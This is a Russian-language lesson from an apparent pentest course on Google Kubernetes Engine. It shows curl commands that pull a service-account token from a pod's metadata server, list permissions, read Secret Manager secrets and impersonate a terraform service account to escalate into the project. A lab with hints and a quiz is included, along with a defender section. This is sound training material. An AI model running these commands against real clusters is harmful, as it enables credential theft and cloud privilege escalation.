---
id: cloud-gcp-gke
title: "GKE: Workload Identity, node SA и захват метаданных пода"
category: cloud
parent: cloud-gcp-data-deep
difficulty: hard
order: 3
tags: [cloud, gcp, gke, kubernetes, workload-identity, metadata, service-account]
prerequisites: [cloud-gcp-data-deep, cloud-kubernetes-rbac]
useful_for:
  - "Пентест Google Kubernetes Engine"
  - "Захват токена сервисного аккаунта из пода"
  - "Lateral movement от пода к проекту GCP"
estimated_minutes: 50
summary: "GKE: node service account, Workload Identity и metadata-сервер пода. Как из контейнера получить токен GCP, перечислить права и эскалировать в проект."
lab:
  kind: shell
  title: "Практика: GKE — Workload Identity и node SA"
  toolset: [core, curl]
  workdir: /home/student/gke
  files: [task.md, notes.md]
  check: "grep -q 'nto{' found.txt"
  hints:
    - "Возьми токен SA пода: `curl -s -H \"Metadata-Flavor: Google\" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token`."
    - "Затем прочитай атрибут с флагом: `.../instance/attributes/flag`."
    - "Найди флаг: `curl ... attributes/flag > found.txt`."

---

## Задача

**GKE** — управляемый Kubernetes в GCP, и одновременно самая частая точка входа в проект. Причина архитектурная: по умолчанию под может спросить у **metadata-сервера** GCP токен **node service account** — аккаунта, под которым работают узлы кластера. Если Workload Identity не настроен, этот токен часто имеет права на весь проект.

Цель урока: из пода GKE получить токен GCP, узнать его права и эскалировать в проект.

## Данные, с которыми работаем

Разберём модель:
- **Node pool** — группа узлов; у них есть node service account (по умолчанию `PROJECT_NUMBER-compute@developer.gserviceaccount.com`).
- **Workload Identity** — механизм, позволяющий поду «притворяться» отдельным GCP service account (GSA).
- **Metadata server** — локальный сервис `http://metadata.google.internal` (`169.254.169.254`), отдающий токен.

Первым делом спрашиваем, **чей** мы аккаунт:

```bash
$ curl -s -H "Metadata-Flavor: Google" \
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email"
1234567890-compute@developer.gserviceaccount.com
```

Суффикс `-compute@developer.gserviceaccount.com` — это **node SA**, то есть Workload Identity не изолирует под: мы получили идентичность узла. Заголовок `Metadata-Flavor: Google` обязателен — так GCP защищает metadata от простого SSRF.

## Шаг 1: получаем токен и сохраняем

```bash
$ TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" | jq -r .access_token)
$ echo ${TOKEN:0:20}...
ya29.c.b0Aa...
```

## Шаг 2: выясняем права без перебора

Вместо того чтобы вслепую пробовать API, спрашиваем у GCP напрямую, что нам разрешено, через **`testIamPermissions`** — эндпоинт, который возвращает пересечение запрошенных прав и наших:

```bash
$ curl -s -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
    -X POST "https://cloudresourcemanager.googleapis.com/v1/projects/acme-prod:testIamPermissions" \
    -d '{"permissions":["storage.buckets.list","secretmanager.versions.access","iam.serviceAccounts.actAs"]}'
{"permissions":["storage.buckets.list","secretmanager.versions.access","iam.serviceAccounts.actAs"]}
```

Все три права есть. `storage.buckets.list` — читать бакеты, `secretmanager.versions.access` — читать секреты, а `iam.serviceAccounts.actAs` — **действовать от имени других сервисных аккаунтов**. Последнее — прямой путь к эскалации.

## Шаг 3: читаем секреты проекта

```bash
$ curl -s -H "Authorization: Bearer $TOKEN" \
    "https://secretmanager.googleapis.com/v1/projects/acme-prod/secrets?pageSize=50" | jq -r '.secrets[].name' | head -3
projects/acme-prod/secrets/db-password
projects/acme-prod/secrets/stripe-key
projects/acme-prod/secrets/jwt-signing-key
$ curl -s -H "Authorization: Bearer $TOKEN" \
    "https://secretmanager.googleapis.com/v1/projects/acme-prod/secrets/db-password/versions/latest:access" \
    | jq -r .payload.data | base64 -d
Prod_DB_S3cret!
```

`payload.data` приходит в base64 — декодируем. Один под без единого эксплойта дал пароль продовой базы.

## Шаг 4: эскалируем через actAs

`actAs` позволяет выпустить токен от имени **любого** сервисного аккаунта. Сначала перечислим их:

```bash
$ curl -s -H "Authorization: Bearer $TOKEN" \
    "https://iam.googleapis.com/v1/projects/acme-prod/serviceAccounts" | jq -r '.accounts[].email'
ci-runner@acme-prod.iam.gserviceaccount.com
terraform@acme-prod.iam.gserviceaccount.com
1234567890-compute@developer.gserviceaccount.com
```

Аккаунт `terraform@` — почти наверняка широкий. Выпускаем его токен:

```bash
$ curl -s -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
    -X POST "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/terraform@acme-prod.iam.gserviceaccount.com:generateAccessToken" \
    -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"],"lifetime":"3600s"}' | jq -r .accessToken | head -c 20
ya29.c.b0Aa...
```

Теперь мы работаем от имени `terraform@`, у которого, как правило, `roles/editor` или `roles/owner`. Цепочку можно продолжать, «прыгая» от одного SA к другому до самого привилегированного.

## Полный прогон от начала до конца

1. Спросили metadata → получили email node SA.
2. Взяли access token.
3. `testIamPermissions` → `storage.buckets.list`, `secretmanager.versions.access`, `actAs`.
4. Прочитали секреты проекта.
5. Имперсонировали `terraform@` через `actAs` → права уровня проекта.

## Если Workload Identity включён: что проверять

Если `email` в metadata — это конкретный GSA (не node SA), изоляция работает. Но она может быть слабой:
- **KSA ↔ GSA mapping.** Kubernetes ServiceAccount пода может быть привязан к **слишком широкому** GSA. Ищи `serviceAccountName` в манифестах других подов и проверяй их права.
- **`actAs` на `*`.** Право имперсонировать **любой** SA обнуляет изоляцию.
- **OAuth scopes узла.** Даже широкий SA не вызовет часть API, если у узла узкие scopes — проверяй `--scopes` node pool.
- **Autopilot.** Workload Identity включён по умолчанию, но GSA могут быть широкими.
- **Network policy.** Metadata доступен по локальному адресу `169.254.169.254` — network policy его не всегда покрывает.

## Частые ошибки и подводные камни

- **Считать managed-кластер защищённым.** Node SA часто имеет `roles/editor` — компрометация пода равна компрометации проекта.
- **Забывать про `actAs`.** Право имперсонировать сервисный аккаунт — прямой путь к эскалации.
- **Игнорировать OAuth scopes узла.** Даже широкий SA не вызовет часть API, если у узла узкие scopes.
- **Не проверять KSA/GSA mapping.** Под с KSA, привязанным к широкому GSA, обнуляет изоляцию Workload Identity.
- **Путать `roles/editor` и `roles/owner`.** Editor широк, но не управляет IAM; owner даёт всё.
- **Считать metadata недоступным.** Адрес `169.254.169.254` локальный, network policy его не всегда покрывает.

- **Забывать про Autopilot.** Там Workload Identity включён по умолчанию, но GSA могут быть широкими.
- **Не проверять другие поды.** Иногда в соседнем namespace есть KSA, привязанный к `roles/container.admin`.
- **Считать, что metadata закрыт network policy.** Адрес локальный, и политика его часто не покрывает.
- **Игнорировать scopes.** Узел с `--scopes` из ограниченного набора не вызовет часть API, даже если SA широкий.

- **Не перечислять сервисные аккаунты.** `iam.googleapis.com/v1/projects/.../serviceAccounts` показывает, на кого можно встать через `actAs`.
- **Забывать про цепочку.** Имперсонация позволяет «прыгать» от одного SA к другому до самого привилегированного.
- **Считать, что один токен — это конец.** Токен живёт около часа; для длительной работы его нужно обновлять.

## Что мы теперь знаем

- Без Workload Identity под видит **node SA** через metadata-сервер.
- `Metadata-Flavor: Google` обязателен; токен берётся с `.../default/token`.
- `testIamPermissions` показывает права без перебора API.
- `secretmanager.versions.access` читает секреты; данные приходят в base64.
- `iam.serviceAccounts.actAs` позволяет имперсонировать SA — прямой путь к эскалации.
- Workload Identity изолирует, но только если GSA привязан с минимальными правами.

## На что смотреть дальше

- **gcp-cloudsql**: публичный доступ и IAM database auth.
- **gcp-metadata**: другие способы злоупотребить metadata.
- **cloud-privesc-iam**: что делать с ролью, полученной в проекте.

## Глазами защитника

Workload Identity связывает Kubernetes SA с Google SA; node SA делают минимальной, потому что её креды доступны всем подам узла. Аннотации `iam.gke.io/gcp-service-account` аудируют: право менять SA в кластере равно праву выдать себе облачную роль. Включают Shielded Nodes, Binary Authorization, ограничивают `roles/container.admin`. В Cloud Audit Logs следят за генерацией токенов и имперсонациями. Metadata-сервер защищают, ограничивая доступ подов к нему через Workload Identity.

## Частые вопросы

**Как под получает Google-токен?**

Через metadata-сервер с Workload Identity: под обращается к `metadata.google.internal`, GKE подставляет токен привязанной Google SA. Если под может менять аннотацию SA — он выберет более мощную.

**Что такое `actAs`?**

Право `iam.serviceAccounts.actAs` позволяет действовать от имени SA: выписать его токен. Цепочка `actAs` часто ведёт от узкой роли к владельцу проекта.

**Почему node SA — цель?**

Она доступна всем подам узла через metadata, если Workload Identity не ограничивает. Обычно у неё есть доступ к реестру, логам и другим сервисам — это общий мост.

**Как читать секреты проекта?**

Через `gcloud secrets versions access` или напрямую Secret Manager API. Нужен токен с правом `secretmanager.versions.access` — его даёт захваченная SA.

**Как защититься?**

Минимальная node SA, Workload Identity вместо node-кред, аудит аннотаций SA, ограничение `actAs` и `container.admin`, включение аудит-логов и Shielded Nodes.

**Что если Workload Identity выключен?**

Тогда поды используют креды node SA напрямую через metadata. Это хуже: любой под получает права узла, и разграничение по SA пропадает.

**Как узнать свою Google SA из пода?**

Через metadata: запрос к `.../instance/service-accounts/default/email`. Или по аннотации `iam.gke.io/gcp-service-account` на Kubernetes SA.

**Что делать без права на имперсонацию?**

Использовать права самой SA: читать бакеты, секреты, вызывать API. Имперсонация — ускорение, а не единственный путь.

**Чем GKE Autopilot отличается?**

В Autopilot узлы управляются Google, `privileged` и `hostPath` запрещены, поэтому побег на узел сильно ограничен. Основная поверхность — облачные права подов через Workload Identity.

**Что если у пода нет привязанной SA?**

Тогда он использует node SA через metadata. Это означает, что права узла доступны поду, и разграничение по подам теряется — частая и опасная конфигурация.

**Как понять, какие права у захваченной SA?**

`gcloud auth list`, затем `gcloud projects get-iam-policy` или инструменты вроде `gcp-iam-collector`. Ищи роли с `iam.serviceAccounts.actAs` и доступом к Secret Manager.

**Помогает ли network policy против metadata?**

Нет, metadata-сервер находится вне pod-сети кластера. Ограничивают доступ иначе — через Workload Identity и режим `GKE_METADATA`, который подменяет node-токен на токен привязанной SA.

**Что если Workload Identity настроен, но поду нужна другая SA?**

Он может запросить токен только привязанной SA. Чтобы получить более широкую, нужно право `iam.serviceAccounts.getAccessToken`/`actAs` на неё или возможность изменить аннотацию своего SA. Без этого остаются только права текущей SA.

## Квиз

Проверь себя.

```quiz
- question: "Чей токен получает под GKE без Workload Identity?"
  options:
    - "Node service account узла кластера"
    - "Личный аккаунт разработчика"
    - "GSA конкретного пода"
    - "Токен Cloud SQL"
  answer: 0
  explanation: "Без Workload Identity под видит node SA через metadata-сервер."
- question: "Какое право открывает имперсонацию сервисных аккаунтов?"
  options:
    - "iam.serviceAccounts.actAs"
    - "storage.buckets.list"
    - "logging.logs.list"
    - "compute.instances.list"
  answer: 0
  explanation: "actAs позволяет действовать от имени другого SA."
- question: "Зачем проверять OAuth scopes узла?"
  options:
    - "Они могут ограничивать API, доступные даже широкому SA"
    - "Они шифруют диск"
    - "Они меняют регион"
    - "Они удаляют кластер"
  answer: 0
  explanation: "Даже с roles/editor узел с узкими scopes не вызовет часть API."
- question: "Как называется механизм изоляции SA на под в GKE?"
  options:
    - "Workload Identity"
    - "Cloud IAP"
    - "VPC-SC"
    - "Binary Authorization"
  answer: 0
  explanation: "Workload Identity связывает KSA с GSA и выдаёт токен именно этого GSA."
- question: "Что возвращает эндпоинт testIamPermissions?"
  options:
    - "Пересечение запрошенных прав и тех, что реально есть у принципала"
    - "Список всех секретов"
    - "Список сервисных аккаунтов"
    - "Пароль от базы"
  answer: 0
  explanation: "Он показывает, какие из запрошенных разрешений у вас есть."
```

## Куда дальше

В следующем уроке мы разберём **Cloud SQL** — управляемый PostgreSQL/MySQL в GCP, публичный доступ и IAM database auth. А пока главное запомни: **в GKE главный приз — metadata-сервер**, и один под без Workload Identity может получить права узла, а через `actAs` — всего проекта.

## Где пригодится

- **Пентест GCP:** вход в проект через под GKE.
- **Red team:** lateral movement из кластера.
- **Cloud IR:** анализ злоупотребления SA.
- **Сертификация:** Google Cloud Security.
